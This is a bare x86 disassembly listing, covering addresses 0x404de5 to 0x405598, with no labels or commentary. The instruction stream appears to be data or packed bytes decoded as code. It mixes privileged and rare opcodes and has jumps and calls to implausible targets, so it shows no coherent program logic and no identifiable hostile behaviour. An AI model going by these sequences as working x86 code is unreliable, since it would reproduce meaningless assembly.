  404de5:	sub    al,0x1
  404de7:	xchg   BYTE PTR [eax+0x2b],dl
  404dea:	mov    BYTE PTR [eax],dl
  404dec:	push   eax
  404ded:	mov    ah,0x0
  404def:	mov    eax,ds:0x26c8048
  404df4:	mov    eax,ds:0x3ae91800
  404df9:	sub    BYTE PTR [eax],cl
  404dfb:	rol    cl,0x25
  404dfe:	sbb    BYTE PTR [eax],dl
  404e00:	and    cl,BYTE PTR [ebx+0x2090905]
  404e06:	ret    0x2020
  404e09:	add    BYTE PTR [eax+edx*1+0x12],al
  404e0d:	je     0x404e2a
  404e0f:	or     BYTE PTR [ecx-0x676def70],dl
  404e15:	add    DWORD PTR [eax+0x2584823],edx
  404e1b:	adc    dh,BYTE PTR [eax]
  404e1d:	push   ss
  404e1e:	pusha  
  404e1f:	hlt    
  404e20:	push   eax
  404e21:	add    BYTE PTR [eax],ah
  404e23:	mov    ds:0x180c1a01,al
  404e28:	test   ecx,ebx
  404e2a:	mov    ah,0x0
  404e2c:	pop    DWORD PTR [edx]
  404e2e:	push   ebp
  404e2f:	xchg   esp,eax
  404e30:	inc    esp
  404e31:	inc    esp
  404e32:	inc    eax
  404e33:	shl    BYTE PTR [esi],0x0
  404e36:	add    cl,BYTE PTR [edx]
  404e38:	add    DWORD PTR [ebx-0x398e7de0],ecx
  404e3e:	rol    BYTE PTR [eax],cl
  404e40:	or     BYTE PTR [ecx+0x1004000],dl
  404e46:	and    BYTE PTR [edx],al
  404e48:	or     DWORD PTR [edx+0x3],eax
  404e4b:	add    DWORD PTR [ecx-0x3b],eax
  404e4e:	and    BYTE PTR [edi],ah
  404e50:	xor    BYTE PTR [eax-0x80],bl
  404e53:	and    BYTE PTR [eax],dh
  404e55:	or     ch,ah
  404e57:	mov    cl,0x1
  404e59:	add    al,0x60
  404e5b:	daa    
  404e5c:	dec    esp
  404e5d:	add    BYTE PTR [eax],0x9
  404e60:	adc    BYTE PTR [eax],cl
  404e62:	dec    eax
  404e63:	add    al,0x14
  404e65:	inc    eax
  404e66:	xor    cl,BYTE PTR [eax]
  404e68:	sub    eax,0x2d0a5845
  404e6d:	and    al,0x2
  404e6f:	pusha  
  404e70:	add    DWORD PTR [eax],ebp
  404e72:	mov    al,ds:0x90026007
  404e77:	sbb    al,0xc0
  404e79:	or     DWORD PTR [eax],eax
  404e7b:	loopne 0x404e07
  404e7d:	push   eax
  404e7e:	or     ah,BYTE PTR [eax+ecx*2+0x4c0830]
  404e85:	add    al,0x40
  404e87:	sbb    BYTE PTR [eax+0x402402b],dh
  404e8d:	xor    al,al
  404e8f:	or     al,0x68
  404e91:	adc    BYTE PTR [ecx],cl
  404e93:	sbb    dl,BYTE PTR [ebp+0x8379205]
  404e99:	add    BYTE PTR [ecx],al
  404e9b:	add    BYTE PTR [ecx],al
  404e9d:	and    al,0x12
  404e9f:	and    eax,0x90201e00
  404ea4:	inc    esp
  404ea5:	sub    BYTE PTR [ecx],dl
  404ea7:	nop
  404ea8:	add    al,0x0
  404eaa:	call   DWORD PTR ds:0x414d30
  404eb0:	adc    al,0x80
  404eb2:	add    BYTE PTR [eax+0x40],al
  404eb5:	test   al,0xa4
  404eb7:	or     BYTE PTR [eax-0x7f5f6800],al
  404ebd:	add    BYTE PTR [eax],al
  404ebf:	bound  edx,QWORD PTR [eax]
  404ec1:	cdq    
  404ec2:	test   al,0x11
  404ec4:	or     BYTE PTR [edx+esi*1],dl
  404ec7:	xchg   BYTE PTR [eax],dh
  404ec9:	or     BYTE PTR [edx-0x5c675bf8],ch
  404ecf:	push   es
  404ed0:	inc    ebp
  404ed1:	push   edx
  404ed2:	add    BYTE PTR [edx+eax*1+0x4008],al
  404ed9:	lea    esp,[eax+eax*2+0x2210162]
  404ee0:	add    al,0x50
  404ee2:	and    al,0x14
  404ee4:	mov    eax,ds:0xe1e10a00
  404ee9:	add    al,0x28
  404eeb:	adc    BYTE PTR [esi+0x54],bl
  404eee:	add    dl,BYTE PTR [ecx]
  404ef0:	add    BYTE PTR [ecx],dh
  404ef2:	inc    esp
  404ef3:	add    ah,BYTE PTR [eax]
  404ef5:	push   es
  404ef6:	add    BYTE PTR [eax],al
  404ef8:	add    BYTE PTR [eax+0x1a8210f3],al
  404efe:	add    BYTE PTR [ecx],cl
  404f00:	push   eax
  404f01:	sub    DWORD PTR [ecx+0x1002442],esp
  404f07:	and    BYTE PTR [eax+eax*1],0x3b
  404f0b:	inc    eax
  404f0c:	mov    cl,0x18
  404f0e:	add    al,0x40
  404f10:	add    al,0x20
  404f12:	cwde   
  404f13:	adc    eax,0x4014002
  404f18:	xor    esp,eax
  404f1a:	add    BYTE PTR [eax+0x40028a54],al
  404f20:	add    DWORD PTR [edx+0x43],eax
  404f23:	adc    BYTE PTR [ecx],al
  404f25:	or     DWORD PTR [eax+0x31],edi
  404f28:	or     al,0x80
  404f2a:	add    DWORD PTR [eax],esp
  404f2c:	push   ss
  404f2d:	and    BYTE PTR [eax],cl
  404f2f:	rol    BYTE PTR [ecx+0x60],1
  404f32:	add    al,al
  404f34:	add    BYTE PTR [ecx+eax*1],dl
  404f37:	and    BYTE PTR [eax-0x3d7732fe],dh
  404f3d:	xor    al,BYTE PTR [edx]
  404f3f:	sbb    eax,0x4211c3
  404f44:	arpl   WORD PTR cs:[ecx],ax
  404f47:	add    BYTE PTR [eax],0x1a
  404f4a:	adc    BYTE PTR [eax],al
  404f4c:	add    BYTE PTR [ebx+eax*4],cl
  404f4f:	test   BYTE PTR [ecx],dl
  404f51:	inc    ebp
  404f52:	or     BYTE PTR [edi],bl
  404f54:	in     eax,dx
  404f55:	sub    al,al
  404f57:	dec    ecx
  404f58:	test   BYTE PTR ds:0x2288023,dl
  404f5e:	push   cs
  404f5f:	or     eax,eax
  404f61:	enter  0x2071,0x9
  404f65:	and    eax,DWORD PTR [edx]
  404f67:	and    al,BYTE PTR [eax+eax*4]
  404f6a:	and    BYTE PTR [eax],al
  404f6c:	add    BYTE PTR [ecx+0x58040ad],dl
  404f72:	dec    ecx
  404f73:	add    al,BYTE PTR [edx]
  404f75:	add    BYTE PTR [eax],dl
  404f77:	mov    ds:0x84200,al
  404f7c:	add    BYTE PTR [eax+0x50],ah
  404f7f:	sbb    DWORD PTR [eax+0x50],edx
  404f82:	pusha  
  404f83:	add    al,BYTE PTR [edx+0x28]
  404f86:	add    DWORD PTR [ecx],esp
  404f88:	add    al,BYTE PTR [eax+0x30]
  404f8b:	and    BYTE PTR [edx],cl
  404f8d:	inc    edx
  404f8e:	dec    ecx
  404f8f:	adc    DWORD PTR [edx],0x608093ac
  404f95:	add    eax,0x1a40809
  404f9a:	dec    ecx
  404f9b:	xor    BYTE PTR [eax],al
  404f9d:	mov    al,BYTE PTR [esp+ecx*1+0x44483011]
  404fa4:	and    BYTE PTR [eax-0x18],ah
  404fa7:	fs add al,0x10
  404faa:	nop
  404fab:	sbb    DWORD PTR [ebx+0x4],0x8884008
  404fb2:	inc    ebp
  404fb3:	xchg   ecx,eax
  404fb4:	add    BYTE PTR [eax],bl
  404fb6:	sub    al,BYTE PTR [eax]
  404fb8:	add    al,0x41
  404fba:	inc    eax
  404fbb:	mov    ah,0x0
  404fbd:	add    al,BYTE PTR [eax]
  404fbf:	adc    dl,BYTE PTR [eax+0x0]
  404fc2:	and    BYTE PTR [edx],dl
  404fc4:	sub    eax,edx
  404fc6:	inc    edx
  404fc7:	and    dl,dl
  404fc9:	and    BYTE PTR [eax],al
  404fcb:	add    dl,BYTE PTR [eax]
  404fcd:	push   ss
  404fce:	inc    eax
  404fcf:	add    eax,DWORD PTR [ecx]
  404fd1:	or     al,BYTE PTR [eax+eiz*1]
  404fd4:	adc    DWORD PTR [eax],0x488421c8
  404fda:	sbb    ecx,DWORD PTR [eax]
  404fdc:	and    al,0x81
  404fde:	adc    BYTE PTR [eax],al
  404fe0:	and    BYTE PTR [eax],bl
  404fe2:	cwde   
  404fe3:	pop    ss
  404fe4:	add    BYTE PTR [eax+0x15],al
  404fe7:	dec    ecx
  404fe8:	add    dl,BYTE PTR [eax]
  404fea:	push   ss
  404feb:	mov    al,ds:0x40e42000
  404ff0:	push   ss
  404ff1:	dec    edx
  404ff2:	jbe    0x404ff4
  404ff4:	xor    dh,BYTE PTR [edx]
  404ff6:	add    BYTE PTR [edx-0x6bfad8f8],al
  404ffc:	adc    BYTE PTR [edx+0x22],cl
  404fff:	adc    al,0x80
  405001:	add    DWORD PTR [eax-0x7ebff37e],eax
  405007:	add    dl,BYTE PTR [ecx]
  405009:	xor    BYTE PTR [eax],al
  40500b:	add    al,0x3
  40500d:	and    DWORD PTR [eax],0x3029b16
  405013:	pusha  
  405014:	adc    al,0x10
  405016:	adc    BYTE PTR [eax],0x24
  405019:	sbb    DWORD PTR [eax],0x11124028
  40501f:	inc    esp
  405020:	add    al,0x2d
  405022:	add    al,BYTE PTR [edx+0x4222c020]
  405028:	adc    BYTE PTR [eax+0x2],al
  40502b:	adc    al,al
  40502d:	push   eax
  40502e:	inc    ebx
  40502f:	push   es
  405030:	and    al,0xf0
  405032:	scas   eax,DWORD PTR es:[edi]
  405033:	add    cl,BYTE PTR [eax]
  405035:	add    al,0x14
  405038:	add    al,BYTE PTR [eax+0x40061005]
  40503e:	xchg   esp,eax
  40503f:	inc    edx
  405040:	push   ecx
  405041:	pop    eax
  405042:	add    DWORD PTR [ebx+0x1820a8c],esp
  405048:	add    BYTE PTR [eax],cl
  40504a:	add    eax,DWORD PTR [eax]
  40504c:	push   es
  40504d:	add    BYTE PTR [edx],0x0
  405050:	and    BYTE PTR [edx],0x54
  405053:	add    al,BYTE PTR [ecx-0x68]
  405056:	inc    ebp
  405057:	inc    eax
  405058:	call   0x4190a263
  40505d:	call   0x189d16b
  405062:	jns    0x405085
  405064:	pop    es
  405065:	sbb    BYTE PTR [eax+0x23],al
  405068:	add    BYTE PTR [eax],ah
  40506a:	add    al,0x4e
  40506c:	xchg   ecx,eax
  40506d:	adc    bl,BYTE PTR [eax-0x6f]
  405070:	ins    BYTE PTR es:[edi],dx
  405071:	add    BYTE PTR [eax],al
  405073:	add    BYTE PTR [edx],0x30
  405076:	add    BYTE PTR ds:0x3c005204,dh
  40507c:	and    al,0x40
  40507e:	and    BYTE PTR [eax-0x6daed7f8],al
  405084:	add    eax,DWORD PTR [edi]
  405086:	sub    DWORD PTR [ebx],0xa0980283
  40508c:	and    DWORD PTR [eax],eax
  40508e:	lock add BYTE PTR [eax+0x4c240200],0x2
  405096:	dec    esp
  405097:	push   ebp
  405098:	add    al,BYTE PTR [eax+0x2085881]
  40509e:	lds    esp,FWORD PTR [edx-0x33]
  4050a1:	jle    0x304a5127
  4050a7:	add    BYTE PTR [eax],al
  4050a9:	adc    BYTE PTR [ecx],cl
  4050ab:	and    al,0x51
  4050ad:	and    al,al
  4050af:	xchg   ebp,eax
  4050b0:	adc    DWORD PTR [edx+0x2940200],ebx
  4050b6:	or     dl,BYTE PTR [eax]
  4050b8:	add    BYTE PTR [eax],cl
  4050ba:	inc    esi
  4050bb:	add    dl,al
  4050bd:	add    BYTE PTR [edx],0x58
  4050c0:	push   esp
  4050c1:	mov    ah,BYTE PTR [eax]
  4050c3:	add    ah,BYTE PTR [edx]
  4050c5:	shl    BYTE PTR [eax+edx*1],0x81
  4050c9:	add    DWORD PTR [esi+0x0],eax
  4050cc:	adc    BYTE PTR [eax+ecx*1],al
  4050cf:	or     DWORD PTR [eax],esp
  4050d1:	inc    eax
  4050d2:	sub    eax,DWORD PTR [eax]
  4050d4:	or     BYTE PTR [eax+eax*2],bh
  4050d7:	mov    ds:0x1a012cc4,al
  4050dc:	xchg   esp,eax
  4050dd:	add    BYTE PTR [eax-0x3d],al
  4050e0:	pop    ss
  4050e1:	add    BYTE PTR [esi],al
  4050e3:	add    BYTE PTR ds:0x29c3000a,al
  4050e9:	add    eax,0x4500a8
  4050ee:	inc    esp
  4050ef:	inc    eax
  4050f0:	or     BYTE PTR [eax],al
  4050f2:	xor    DWORD PTR [eax],eax
  4050f4:	or     ecx,DWORD PTR [ebx+0x19047]
  4050fa:	add    BYTE PTR ds:0x20e05428,dh
  405100:	sbb    BYTE PTR [ebx+0xa],dl
  405103:	popa   
  405104:	mov    ds:0x80001140,eax
  405109:	inc    edx
  40510a:	inc    eax
  40510b:	or     DWORD PTR [esi+eax*4],eax
  40510e:	or     BYTE PTR [eax],al
  405110:	add    DWORD PTR ds:0x10800060,ebp
  405116:	and    BYTE PTR [eax],al
  405118:	adc    BYTE PTR [edx+0x7c201100],al
  40511e:	add    BYTE PTR [ecx-0x3e3f5ffe],al
  405124:	adc    bl,BYTE PTR [eax]
  405126:	add    BYTE PTR [eax-0x40],bh
  405129:	cmp    al,0xc5
  40512b:	add    al,BYTE PTR [eax+0x46]
  40512e:	xchg   BYTE PTR [ecx+eax*1],al
  405131:	sub    BYTE PTR [eax+0x26],0x34
  405135:	inc    eax
  405136:	add    BYTE PTR [eax],al
  405138:	add    BYTE PTR [eax],dl
  40513a:	les    esp,FWORD PTR [eax+0x0]
  40513d:	add    BYTE PTR [ecx+edx*1],al
  405140:	add    BYTE PTR [edx],al
  405142:	inc    ecx
  405143:	and    al,BYTE PTR [edx]
  405145:	push   ss
  405146:	xlat   BYTE PTR ds:[ebx]
  405147:	add    dl,BYTE PTR [ebx]
  405149:	jae    0x4051af
  40514b:	in     al,dx
  40514c:	xor    BYTE PTR [ecx],al
  40514e:	add    al,0x12
  405150:	and    BYTE PTR [edx],0x1
  405153:	push   edx
  405154:	add    DWORD PTR [eax],eax
  405156:	add    BYTE PTR [eax],ah
  405158:	mov    al,ds:0xd7a1640
  40515d:	xchg   ebx,eax
  40515e:	or     BYTE PTR ds:0xa8,ah
  405164:	add    al,0x89
  405166:	add    edx,0x23034421
  40516c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40516d:	and    BYTE PTR [eax+0x21],ah
  405170:	inc    ebx
  405171:	mov    al,BYTE PTR [ecx]
  405173:	mov    WORD PTR [ecx-0x7c],es
  405176:	add    al,0x81
  405179:	and    DWORD PTR [eax],esi
  40517b:	les    ebx,FWORD PTR [eax]
  40517d:	inc    eax
  40517e:	mov    dl,0x41
  405180:	adc    BYTE PTR [eax+0xc],al
  405183:	push   cs
  405184:	add    eax,0x822200
  405189:	push   cs
  40518a:	or     BYTE PTR [eax+edx*1+0xa38280],0xc0
  405192:	add    al,0xc
  405194:	add    dl,BYTE PTR [edx]
  405196:	and    BYTE PTR [eax+0xa02684],0x8
  40519d:	inc    esi
  40519e:	dec    esp
  40519f:	add    DWORD PTR [eax+0x1],eax
  4051a2:	xchg   DWORD PTR [ecx],ebx
  4051a4:	add    al,0x20
  4051a6:	push   es
  4051a7:	or     al,BYTE PTR [eax+0x10]
  4051aa:	sub    eax,DWORD PTR [eax+0x44]
  4051ad:	push   es
  4051ae:	and    dl,cl
  4051b0:	xor    BYTE PTR [eax],dl
  4051b2:	xor    al,BYTE PTR [eax-0x3e]
  4051b5:	add    DWORD PTR [ecx],esi
  4051b7:	add    al,0x80
  4051b9:	add    DWORD PTR [eax+0x4169c4c6],0x32651034
  4051c3:	sbb    BYTE PTR [ecx],ah
  4051c5:	add    dl,BYTE PTR [eax+0x48b0400]
  4051cb:	add    BYTE PTR [esi],0x4
  4051ce:	or     cl,ah
  4051d0:	add    BYTE PTR [eax],al
  4051d2:	add    DWORD PTR [eax+eax*1],eax
  4051d5:	add    BYTE PTR [eax],dl
  4051d7:	mov    al,ds:0x2b001ac5
  4051dc:	adc    BYTE PTR [ecx],0x4
  4051df:	adc    dl,BYTE PTR [eax]
  4051e1:	and    ebx,DWORD PTR [edx]
  4051e3:	add    BYTE PTR [ebx+0x5408000],ah
  4051e9:	push   ebp
  4051ea:	xor    al,BYTE PTR [eax+eax*1]
  4051ed:	mov    al,ds:0x40298104
  4051f2:	adc    al,al
  4051f4:	push   ecx
  4051f5:	adc    BYTE PTR [edx],cl
  4051f7:	inc    eax
  4051f8:	sbb    BYTE PTR [esp+eax*1+0x9],al
  4051fc:	sbb    eax,0x18488490
  405201:	inc    ecx
  405202:	sub    BYTE PTR [ecx+0x51],0x12
  405206:	nop
  405207:	and    DWORD PTR [eax+0x8401028],eax
  40520d:	add    ah,BYTE PTR [ecx]
  40520f:	cmp    bh,BYTE PTR [eax]
  405211:	pusha  
  405212:	and    edx,DWORD PTR [eax]
  405214:	popa   
  405215:	or     BYTE PTR [esi],al
  405217:	add    eax,0x9d80040
  40521c:	and    BYTE PTR [edx+0x19],al
  40521f:	rcl    DWORD PTR [ecx],0x19
  405222:	and    bl,BYTE PTR [eax+edx*1]
  405225:	cmp    eax,0x302000
  40522a:	dec    eax
  40522b:	xchg   edx,eax
  40522c:	dec    ebp
  40522d:	inc    eax
  40522e:	retf   0x104
  405231:	adc    BYTE PTR [eax+0x2120b41],dl
  405237:	xchg   edx,eax
  405238:	dec    esi
  405239:	or     edx,eax
  40523b:	and    BYTE PTR gs:[eax+0x96e0b80],al
  405242:	mov    al,ds:0x70408420
  405247:	rcl    BYTE PTR [ecx],cl
  405249:	mov    WORD PTR [edx],cs
  40524b:	adc    al,0x4
  40524d:	adc    DWORD PTR [eax],eax
  40524f:	dec    eax
  405250:	and    cl,BYTE PTR [esp+esi*2]
  405253:	jne    0x405267
  405255:	or     BYTE PTR [ebx],ah
  405257:	add    DWORD PTR [eax+0x0],esp
  40525a:	add    DWORD PTR [eax],edx
  40525c:	dec    esp
  40525d:	add    BYTE PTR [eax+edx*1+0x31a6c00],ah
  405264:	adc    BYTE PTR [eax-0x7e],dl
  405267:	mov    ds:0x7262104,al
  40526c:	and    BYTE PTR [eax],0x0
  40526f:	and    cl,BYTE PTR [eax+0x906484c]
  405275:	add    DWORD PTR [edx],eax
  405277:	xchg   ebp,eax
  405278:	add    BYTE PTR [edx],dl
  40527a:	cwde   
  40527b:	xchg   ebp,eax
  40527c:	inc    eax
  40527d:	push   esp
  40527e:	or     DWORD PTR [eax+0x20407d00],esp
  405284:	add    DWORD PTR [ebx+0x1101812],ecx
  40528a:	add    BYTE PTR [eax],al
  40528c:	xor    DWORD PTR [eax-0x11ffdfee],esi
  405292:	or     al,0x0
  405294:	lods   eax,DWORD PTR ds:[esi]
  405295:	adc    al,0xa1
  405297:	and    BYTE PTR [eax+0x20],al
  40529a:	nop
  40529b:	mov    al,ds:0xc00824
  4052a0:	adc    BYTE PTR [ebp+0x0],al
  4052a3:	inc    ebx
  4052a4:	mov    al,ds:0x250cbaca
  4052a9:	cmp    BYTE PTR [edi+eax*1+0x18010003],dh
  4052b0:	xor    BYTE PTR [ecx+0x1521ec20],ch
  4052b6:	add    esp,edx
  4052b8:	and    ecx,DWORD PTR [ecx]
  4052ba:	mov    BYTE PTR [edx],al
  4052bc:	add    edi,esp
  4052be:	and    eax,esp
  4052c0:	stos   BYTE PTR es:[edi],al
  4052c1:	and    eax,0x81108012
  4052c6:	inc    eax
  4052c7:	add    bh,BYTE PTR [ecx+ecx*1+0xa]
  4052cb:	and    BYTE PTR [eax+eax*1],ah
  4052ce:	pop    es
  4052cf:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4052d1:	lods   al,BYTE PTR ds:[esi]
  4052d2:	test   BYTE PTR [eax+0x421190],cl
  4052d8:	add    BYTE PTR fs:[eax],dl
  4052db:	adc    BYTE PTR [eax],ah
  4052dd:	add    dl,BYTE PTR ss:[eax+0x1212c06]
  4052e4:	push   es
  4052e5:	and    BYTE PTR [esi+ecx*1],al
  4052e8:	inc    edx
  4052e9:	inc    edx
  4052ea:	fist   DWORD PTR [edx]
  4052ec:	or     al,0x0
  4052ee:	pusha  
  4052ef:	add    al,0x81
  4052f1:	ror    cl,1
  4052f3:	sbb    cl,BYTE PTR [eax+eiz*8]
  4052f6:	dec    ecx
  4052f7:	adc    BYTE PTR [eax],cl
  4052f9:	inc    esp
  4052fa:	adc    BYTE PTR [ecx+0x40041009],al
  405300:	or     BYTE PTR [ecx+0x2ab04148],al
  405306:	adc    DWORD PTR [eax+0x18],eax
  405309:	adc    BYTE PTR [eax],al
  40530b:	sub    eax,DWORD PTR [eax]
  40530d:	inc    eax
  40530e:	or     eax,0x4d601001
  405313:	fs xchg esp,eax
  405315:	add    DWORD PTR [edx+edx*8],eax
  405318:	inc    eax
  405319:	xor    BYTE PTR [eax-0x79ddb7b8],al
  40531f:	nop
  405320:	sbb    BYTE PTR [edx],dl
  405322:	sub    DWORD PTR [edx+0x1c08480],esp
  405328:	add    eax,0x5ad018a2
  40532d:	or     cl,BYTE PTR [eax]
  40532f:	repz add al,al
  405332:	nop
  405333:	push   es
  405334:	retf   0xa80
  405337:	add    ecx,eax
  405339:	or     eax,DWORD PTR [ecx]
  40533b:	adc    dl,BYTE PTR [edx-0x1d]
  40533e:	sbb    BYTE PTR [edx],cl
  405340:	inc    eax
  405341:	adc    DWORD PTR [eax+0x1],eax
  405344:	add    BYTE PTR [eax+0x26620a9c],ah
  40534a:	add    DWORD PTR [edx+0x840008],0x8094800b
  405354:	or     al,0x0
  405356:	adc    eax,DWORD PTR [eax+0x2e003210]
  40535c:	inc    eax
  40535d:	and    DWORD PTR [eax],edi
  40535f:	xor    al,BYTE PTR [edx+0x2]
  405362:	dec    ecx
  405363:	and    DWORD PTR [eax],esi
  405365:	xor    BYTE PTR [ebx+ecx*2],0x24
  405369:	add    al,cl
  40536b:	add    DWORD PTR [eax],0x62202c80
  405371:	nop
  405372:	add    BYTE PTR [eax+edx*1],al
  405375:	test   al,0x0
  405377:	add    al,BYTE PTR [eax]
  405379:	add    eax,0x3a40a80
  40537e:	and    eax,0x42072242
  405383:	add    DWORD PTR [ecx],eax
  405385:	adc    ch,BYTE PTR [ebx]
  405387:	adc    BYTE PTR [eax],cl
  405389:	add    BYTE PTR [eax],0x98
  40538c:	add    al,0x4e
  40538e:	or     dl,BYTE PTR [edx+0x422c4049]
  405394:	adc    DWORD PTR [ecx+0x10580cb8],esp
  40539a:	jmp    0x4053e1
  40539c:	test   BYTE PTR [eax],al
  40539e:	add    DWORD PTR [edx+ecx*1],eax
  4053a1:	or     DWORD PTR [ebx+ebp*1-0x7e],eax
  4053a5:	bound  esp,QWORD PTR [ecx]
  4053a7:	loopne 0x405381
  4053a9:	bound  eax,QWORD PTR ds:0x89283331
  4053af:	and    BYTE PTR [edx],bh
  4053b1:	add    BYTE PTR [eax+ecx*1+0x62],0x1c
  4053b6:	or     DWORD PTR [eax],esp
  4053b8:	xor    ah,BYTE PTR [eax+0x4]
  4053bb:	sbb    ah,BYTE PTR [eax]
  4053bd:	mov    BYTE PTR [eax],cl
  4053bf:	pop    edx
  4053c0:	push   0x128ac492
  4053c5:	add    BYTE PTR [eax],dl
  4053c7:	adc    ch,BYTE PTR [edx]
  4053c9:	jb     0x4053eb
  4053cb:	cmp    al,0x0
  4053cd:	add    BYTE PTR [edx],0x9
  4053d0:	sub    BYTE PTR [ebx+0x34],al
  4053d3:	add    DWORD PTR [esi],edx
  4053d5:	add    dl,BYTE PTR [edx]
  4053d7:	inc    ecx
  4053d8:	and    BYTE PTR [eax+eax*1],al
  4053db:	add    BYTE PTR [edx],al
  4053dd:	dec    eax
  4053de:	add    BYTE PTR es:[eax+0x42],dl
  4053e2:	adc    cl,al
  4053e4:	mov    BYTE PTR [eax],dl
  4053e6:	fcom   QWORD PTR [edx+0x20]
  4053e9:	dec    eax
  4053ea:	rol    BYTE PTR [eax],0x80
  4053ed:	add    BYTE PTR [ebx],al
  4053ef:	add    DWORD PTR [eax+0x40],edx
  4053f2:	pusha  
  4053f3:	mov    cl,BYTE PTR [ebx+0x46184007]
  4053f9:	sbb    DWORD PTR [eax+eax*1],ecx
  4053fc:	adc    BYTE PTR ds:0x28704270,0xa
  405403:	inc    eax
  405404:	add    al,0x93
  405406:	ror    BYTE PTR [ebx+0x50],0x42
  40540a:	add    cl,BYTE PTR [eax]
  40540c:	in     al,dx
  40540d:	add    BYTE PTR [ecx+0x59],al
  405410:	add    BYTE PTR [eax-0xd],ah
  405413:	test   BYTE PTR [ecx],ah
  405415:	sub    BYTE PTR [edi],al
  405417:	and    BYTE PTR [eax+0x20],cl
  40541a:	push   ebx
  40541b:	sub    BYTE PTR [eax],al
  40541d:	test   cl,al
  40541f:	inc    edx
  405420:	push   es
  405421:	mov    bl,BYTE PTR [esi]
  405423:	pop    esp
  405424:	inc    eax
  405425:	add    al,BYTE PTR [ecx]
  405427:	out    dx,al
  405428:	adc    eax,0x10408851
  40542d:	add    BYTE PTR [eax+0x0],ah
  405430:	xor    DWORD PTR [eax],edx
  405432:	xchg   ebx,eax
  405433:	or     DWORD PTR [ecx+0x1],esp
  405436:	add    BYTE PTR [eax],al
  405438:	cmp    BYTE PTR [ebp+0x24],al
  40543b:	or     BYTE PTR [eax-0x6bed5ffc],al
  405441:	push   ss
  405442:	add    BYTE PTR [eax],al
  405444:	ror    BYTE PTR ss:[ecx+0x2084102],0x99
  40544c:	mov    al,ds:0x80415081
  405451:	nop
  405452:	sbb    al,0x1c
  405454:	add    BYTE PTR [esi],0xd
  405457:	and    al,0x32
  405459:	or     BYTE PTR [esi],0x95
  40545c:	or     BYTE PTR [eax-0x65db7000],0x10
  405463:	mov    DWORD PTR ds:0x1010402,esp
  405469:	add    al,0x41
  40546b:	adc    DWORD PTR [edx+0x40],0x803040e
  405472:	adc    BYTE PTR [eax],ah
  405474:	test   BYTE PTR [eax+0x43404032],dh
  40547a:	or     BYTE PTR [eax],cl
  40547c:	adc    bh,BYTE PTR [ebx+0x2a]
  40547f:	add    al,0x0
  405481:	add    BYTE PTR [eax],al
  405483:	dec    eax
  405484:	sbb    ah,0x40
  405487:	cmp    al,0x5
  405489:	pop    edx
  40548a:	add    BYTE PTR [ecx-0x47ed4cb8],ah
  405490:	test   BYTE PTR [eax+edx*1],ah
  405493:	add    al,0x83
  405495:	inc    eax
  405496:	add    al,0x22
  405498:	adc    al,0x40
  40549a:	add    BYTE PTR [ecx+eiz*1],ah
  40549d:	xor    BYTE PTR [eax+0xc48b5a],dl
  4054a3:	sbb    DWORD PTR [eax+0x480a4680],eax
  4054a9:	mov    ah,BYTE PTR [ecx]
  4054ab:	and    BYTE PTR [ecx+edx*4],cl
  4054ae:	je     0x4054d0
  4054b0:	and    BYTE PTR [eax+eiz*1],cl
  4054b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054b4:	add    BYTE PTR [eax+ebx*1+0x60a15032],al
  4054bb:	or     BYTE PTR [eax],al
  4054bd:	add    DWORD PTR [ecx],edx
  4054bf:	and    BYTE PTR [eax],al
  4054c1:	sbb    BYTE PTR [eax],bh
  4054c3:	sub    dh,BYTE PTR [esi+edx*1]
  4054c6:	mov    ah,0x1
  4054c8:	add    DWORD PTR [ecx],ecx
  4054ca:	cmp    dl,BYTE PTR [eax+edx*1+0x46004200]
  4054d1:	adc    edx,DWORD PTR [ecx]
  4054d3:	add    BYTE PTR [eax],al
  4054d5:	test   DWORD PTR [edx+0x12860890],0x80562004
  4054df:	push   eax
  4054e0:	push   edx
  4054e1:	adc    BYTE PTR [ecx+eax*4],ah
  4054e4:	or     DWORD PTR [eax+0x1],0x4a
  4054e8:	adc    al,0x0
  4054ea:	xor    BYTE PTR [ecx+0x2001121],al
  4054f0:	add    BYTE PTR ds:0x28840881,al
  4054f6:	pop    eax
  4054f7:	pop    ss
  4054f8:	add    al,al
  4054fa:	add    DWORD PTR [edx+0x24],eax
  4054fd:	add    al,BYTE PTR [ecx+eax*1-0x798ffc00]
  405504:	nop
  405505:	and    BYTE PTR [eax+0x54],al
  405508:	cmp    BYTE PTR [eax+edx*2+0xa200110],al
  40550f:	inc    eax
  405510:	call   0x60e567b8
  405515:	sbb    DWORD PTR [edx+0x10],esp
  405518:	add    BYTE PTR [edx+ebp*2],0x3
  40551c:	xchg   edx,eax
  40551d:	arpl   WORD PTR [ecx+0x1],ax
  405520:	mov    BYTE PTR [ecx],dh
  405522:	adc    al,0x0
  405524:	adc    eax,eax
  405526:	mov    al,ds:0x4400801
  40552b:	enter  0x10e8,0x40
  40552f:	push   eax
  405530:	sbb    BYTE PTR [eax+0x248498a2],dl
  405536:	and    BYTE PTR [eax-0x80],ch
  405539:	add    BYTE PTR [ecx-0x7c],cl
  40553c:	adc    al,0xd8
  40553e:	xchg   ecx,eax
  40553f:	add    al,0x11
  405541:	sub    BYTE PTR [ecx],0xc
  405544:	add    BYTE PTR [ecx-0x3c],ch
  405547:	sbb    DWORD PTR [ecx+0x784020],eax
  40554d:	adc    al,0x90
  40554f:	or     BYTE PTR [eax+0x48],0x40
  405553:	add    BYTE PTR [edx],dh
  405555:	or     al,0x82
  405557:	or     ecx,DWORD PTR [esi]
  405559:	sbb    al,0x78
  40555b:	sub    al,0x8
  40555d:	add    esp,DWORD PTR [ecx]
  40555f:	xchg   DWORD PTR [eax],eax
  405561:	sbb    al,0x0
  405563:	add    BYTE PTR [eax],al
  405565:	enter  0x3000,0x0
  405569:	adc    BYTE PTR [eax+0x22404099],al
  40556f:	and    BYTE PTR [eax+0x0],dl
  405572:	sub    BYTE PTR [eax+eax*1],ah
  405575:	pop    eax
  405576:	and    BYTE PTR [eax],al
  405578:	dec    edx
  405579:	add    BYTE PTR [edx],dl
  40557b:	inc    edx
  40557c:	add    dl,BYTE PTR [ebp+0x2]
  40557f:	add    dl,al
  405581:	pop    esp
  405582:	and    al,0x9a
  405584:	retf   
  405585:	test   BYTE PTR [eax],ah
  405587:	add    eax,0xa2000a48
  40558c:	or     eax,DWORD PTR [esi+0x16d76401]
  405592:	add    al,al
  405594:	add    BYTE PTR [eax],0x38
  405597:	stos   BYTE PTR es:[edi],al
  405598:	add    BYTE PTR [eax-0x7f],0xe9
